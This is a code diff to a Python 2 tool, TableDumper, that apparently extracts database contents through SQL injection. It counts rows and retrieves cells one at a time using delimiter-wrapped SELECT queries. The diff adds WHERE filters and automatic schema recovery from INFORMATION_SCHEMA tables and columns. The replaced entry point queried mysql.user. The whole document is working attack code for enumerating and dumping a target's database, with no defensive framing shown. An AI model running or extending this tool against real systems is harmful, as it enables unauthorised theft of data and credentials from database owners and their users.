@@ -221,8 +221,8 @@ class TableDumper:
             '<html></html>'
         )
         self.delim = 'scc'
-        self.count_q = "select '{delim}',count({col}),'{delim2}' FROM {tbl};"
-        self.cell_q = "select '{delim}',{col},'{delim2}' FROM {tbl} LIMIT 1 OFFSET {off};"
+        self.count_q = "select '{delim}',count({col}),'{delim2}' FROM {tbl} {where};"
+        self.cell_q = "select '{delim}',{col},'{delim2}' FROM {tbl} {where} LIMIT 1 OFFSET {off};"
         self.encod = 'utf8'
         self.data = None
         self.last_r = None
@@ -234,6 +234,7 @@ class TableDumper:
         if self.outfile_path:
             self.get_file()
         self.VERBOSE = False
+        self.recovered_schema = {}
 
     def get_file(self):
         if self.file:
@@ -286,46 +287,76 @@ class TableDumper:
             s = s.split('...')[0]
         return s
 
-    def get_count(self, tbl, col, set_table_len=False):
+    def get_count(self, tbl, col, set_table_len=False, where=None):
         c = self.get_result(self.count_q.format(
-            delim=self.delim, col=col, delim2=self.delim[::-1], tbl=tbl
+            delim=self.delim, col=col, delim2=self.delim[::-1], tbl=tbl, where=where
         ))
         c = int(self.trim(c))
         if set_table_len:
             self.table_len = c
-            print '{} number of records in tbl {}'.format(c, tbl)
+            print '{} number of records in tbl {} {}'.format(c, tbl, where)
         return c
 
-    def get_cell(self, tbl, col, off):
+    def get_cell(self, tbl, col, off, where=None):
         q = self.cell_q.format(
-            delim=self.delim, col=col, delim2=self.delim[::-1], tbl=tbl, off=off
+            delim=self.delim, col=col, delim2=self.delim[::-1], tbl=tbl, off=off, where=where
         )
         res = self.get_result(q)
         while self.err_string in res:
             res = self.get_result(q)
         return res
 
-    def dump_col(self, tbl, col):
+    def dump_col(self, tbl, col, where=None):
         self.get_count(tbl, col, set_table_len=True)
         for off in range(self.table_len):
-            r = self.get_cell(tbl, col, off)
+            r = self.get_cell(tbl, col, off, where)
             # print self.trim(r)
 
-    def dump_row(self, tbl, cols, off=0):
+    def dump_row(self, tbl, cols, off=0, where=None):
         row = []
         assert(isinstance(row, list))
         for col in cols:
-            row.append(self.trim(self. get_cell(tbl, col, off)))
+            row.append(self.trim(self. get_cell(tbl, col, off, where)))
         return row
 
-    def dump_table(self, tbl, cols):
-        self.get_count(tbl, cols[0], True)
+    def dump_table(self, tbl, cols, where=None, as_list=False):
+        self.get_count(tbl, cols[0], where=where, set_table_len=True)
+        ret = []
         for off in range(self.table_len):
-            r = self.dump_row(tbl, cols, off)
+            r = self.dump_row(tbl, cols, off, where)
             line = StringIO.StringIO()
             writer = csv.writer(line)
             writer.writerow(r)
-            print line.getvalue().strip()
+            v = line.getvalue().strip()
+            print v
+            if as_list:
+                ret.append(v)
+        if ret:
+            return ret
+
+    def get_table_names(self):
+        tbl = 'INFORMATION_SCHEMA.tables'
+        cols = ['table_name']
+        table_names = self.dump_table(tbl, cols, as_list=True)
+        for tn in table_names:
+            self.recovered_schema[tn] = []
+
+    def get_column_names(self):
+        for t in self.recovered_schema.keys():
+            tbl = 'INFORMATION_SCHEMA.columns'
+            cols = ['column_name']
+            where = 'where table_name = \'{}\''.format(t)
+            column_names = self.dump_table(tbl, cols, where=where, as_list=True)
+            if column_names:
+                for cn in column_names:
+                    self.recovered_schema[t] = self.recovered_schema[t] + [cn, ]
+                print t, self.recovered_schema[t]
+            else:
+                print 'no columns for {}?'.format(t)
+
+    def get_schema(self):
+        self.get_table_names()
+        self.get_column_names()
 
 
 def get_cols():
@@ -342,8 +373,5 @@ def get_cols():
 
 if __name__ == '__main__':
     d = TableDumper()
-    print d.get_count('mysql.user', 'user')
-    #cols = get_cols()
-    # for tbl, cols in cols.items():
-    #    print '{}.{}'.format(tbl, cols)
-    #    d.dump_table(tbl, cols)
+    d.get_schema()
+    print d.recovered_schema
